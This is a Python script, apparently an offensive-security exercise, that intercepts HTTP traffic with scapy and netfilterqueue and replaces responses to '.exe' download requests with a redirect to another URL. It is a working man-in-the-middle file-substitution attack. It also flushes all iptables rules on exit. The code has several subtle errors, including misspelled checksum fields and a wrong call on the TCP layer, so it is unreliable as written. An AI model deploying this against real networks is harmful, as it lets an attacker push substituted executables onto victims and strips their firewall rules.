#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import os

acknowledge_list = []

def setting_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksm
    del packet[scapy.TCP].len
    del packet[scapy.TCP].chksm
    return packet

def process_packet(packet):
    # converting the packet into a scapy packet for modification
    pkt_scapy = scapy.IP(packet.get_payload())
    # to check whether a packet contains the HTTP layer or not
    if pkt_scapy.haslayer(scapy.Raw):
        # checking if the destination port is 80, it means that the packet is leaving from our computer and going towards the http port
        if pkt_scapy[scapy.TCP].dport == 80:
            # to check whether there is any exe file in the load field
            if ".exe" in pkt_scapy[scapy.Raw].load:
                print("[*] exe Request")
                acknowledge_list.append(pkt_scapy[scapy.TCP].ack)

       # checking if the source port is 80, it means this packet is leaving from the http port
        elif pkt_scapy(scapy.TCP).sport == 80:
            if pkt_scapy[scapy.TCP].seq in acknowledge_list:
                acknowledge_list.remove(pkt_scapy[scapy.TCP].seq)
                print("[*] Replacing File ")
                modified = setting_load(pkt_scapy, "HTTP/1.1 301 Moved Permanently\nLocation: http://www.example.org/index.asp\n\n")

                packet.set_payload(str(modified))

    packet.accept()


QUEUE_NUM = 0
# insert the iptables FORWARD rule
# os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
os.system("iptables -I OUTPUT -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
os.system("iptables -I INPUT -j NFQUEUE --queue-num {}".format(QUEUE_NUM))

# instantiate the netfilter queue
queue = netfilterqueue.NetfilterQueue()

try:
    # bind the queue number to our callback `process_packet`
    # and start it
    queue.bind(QUEUE_NUM, process_packet)
    queue.run()
except KeyboardInterrupt:
    # if want to exit, make sure we
    # remove that rule we just inserted, going back to normal.
    os.system("iptables --flush")
finally:
    os.system("iptables --flush")